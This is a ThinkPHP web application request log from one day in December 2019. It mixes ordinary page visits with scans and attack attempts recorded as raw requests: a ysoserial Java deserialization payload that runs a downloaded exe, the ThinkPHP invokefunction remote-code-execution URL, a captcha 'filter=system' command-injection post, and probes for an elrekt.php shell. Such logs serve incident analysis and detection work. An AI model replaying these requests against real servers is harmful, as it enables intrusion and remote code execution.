---------------------------------------------------------------
[ 2019-12-01T00:13:05+08:00 ] 177.188.126.179 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.024528s] [åžåçŽ‡ï¼š40.77req/s] [å†…å­˜æ¶ˆè€—ï¼š472.16kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001044s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001078s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000853s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000325s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T00:40:20+08:00 ] 114.5.98.54 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.024174s] [åžåçŽ‡ï¼š41.37req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001064s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000841s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000330s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T00:44:46+08:00 ] 185.60.14.33 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.024127s] [åžåçŽ‡ï¼š41.45req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001035s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001068s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000840s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T02:16:52+08:00 ] 103.43.5.236 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.025738s] [åžåçŽ‡ï¼š38.85req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001085s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001121s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000868s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T02:17:50+08:00 ] 120.14.8.194 POST 114.115.146.220/invoker/readonly
[è¿è¡Œæ—¶é—´ï¼š0.013287s] [åžåçŽ‡ï¼š75.26req/s] [å†…å­˜æ¶ˆè€—ï¼š336.46kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000762s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000795s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'invoker',
    1 => 'readonly',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/invoker/readonly',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'content-length' => '2221',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  '¬í' => '',
  '6Ý…' => '',
  'ysoserial_payloads_CommonsCollections5t' => '',
  'java_util_Collections$UnmodifiableListü%1µìŽ' => '',
  'cmd_exe_/c_C:\\Windows/Temp/download_exet' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T04:25:26+08:00 ] 178.223.71.124 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.025561s] [åžåçŽ‡ï¼š39.12req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000066s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001130s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001164s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001119s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T04:54:48+08:00 ] 54.36.113.62 GET /
[è¿è¡Œæ—¶é—´ï¼š0.027127s] [åžåçŽ‡ï¼š36.86req/s] [å†…å­˜æ¶ˆè€—ï¼š471.55kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001168s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001202s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000887s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000353s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:08:17+08:00 ] 207.180.211.90 GET /
[è¿è¡Œæ—¶é—´ï¼š0.023919s] [åžåçŽ‡ï¼š41.81req/s] [å†…å­˜æ¶ˆè€—ï¼š471.55kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001025s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001058s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000832s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.019299s] [åžåçŽ‡ï¼š51.82req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000065s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001035s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001081s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'public',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012885s] [åžåçŽ‡ï¼š77.61req/s] [å†…å­˜æ¶ˆè€—ï¼š333.13kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000964s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000997s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000208s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/thinkphp/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012948s] [åžåçŽ‡ï¼š77.23req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000944s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000978s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'thinkphp',
    1 => 'html',
    2 => 'public',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000212s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.013066s] [åžåçŽ‡ï¼š76.53req/s] [å†…å­˜æ¶ˆè€—ï¼š333.20kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000952s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000986s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'html',
    1 => 'public',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012669s] [åžåçŽ‡ï¼š78.93req/s] [å†…å­˜æ¶ˆè€—ï¼š333.16kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000942s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000975s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/TP/html/public/index.php
[è¿è¡Œæ—¶é—´ï¼š0.012983s] [åžåçŽ‡ï¼š77.02req/s] [å†…å­˜æ¶ˆè€—ï¼š333.16kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000934s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000967s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'TP',
    1 => 'html',
    2 => 'public',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/elrekt.php
[è¿è¡Œæ—¶é—´ï¼š0.013646s] [åžåçŽ‡ï¼š73.28req/s] [å†…å­˜æ¶ˆè€—ï¼š333.06kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001025s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001061s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'elrekt.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/index.php
[è¿è¡Œæ—¶é—´ï¼š0.019182s] [åžåçŽ‡ï¼š52.13req/s] [å†…å­˜æ¶ˆè€—ï¼š472.21kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001011s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001045s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000887s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000317s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 GET 114.115.146.220/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[è¿è¡Œæ—¶é—´ï¼š0.011150s] [åžåçŽ‡ï¼š89.69req/s] [å†…å­˜æ¶ˆè€—ï¼š341.96kb] [æ–‡ä»¶åŠ è½½ï¼š118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'phpinfo',
    1 => 
    array (
      0 => '1',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:14+08:00 ] 106.12.40.132 POST 114.115.146.220/index.php?s=captcha
[è¿è¡Œæ—¶é—´ï¼š0.010567s] [åžåçŽ‡ï¼š94.63req/s] [å†…å­˜æ¶ˆè€—ï¼š333.96kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000688s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000722s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'captcha',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Go-http-client/1.1',
  'content-length' => '84',
  'connection' => 'close',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'filter' => 
  array (
    0 => 'system',
  ),
  'method' => 'get',
  'server' => 
  array (
    'REQUEST_METHOD' => 'uname',
  ),
  'ipconfig' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000199s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T05:32:15+08:00 ] 106.12.40.132 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.015905s] [åžåçŽ‡ï¼š62.87req/s] [å†…å­˜æ¶ˆè€—ï¼š472.16kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000831s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000304s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T06:51:39+08:00 ] 202.178.121.30 GET 114.115.146.220/
[è¿è¡Œæ—¶é—´ï¼š0.029607s] [åžåçŽ‡ï¼š33.78req/s] [å†…å­˜æ¶ˆè€—ï¼š472.11kb] [æ–‡ä»¶åŠ è½½ï¼š129]
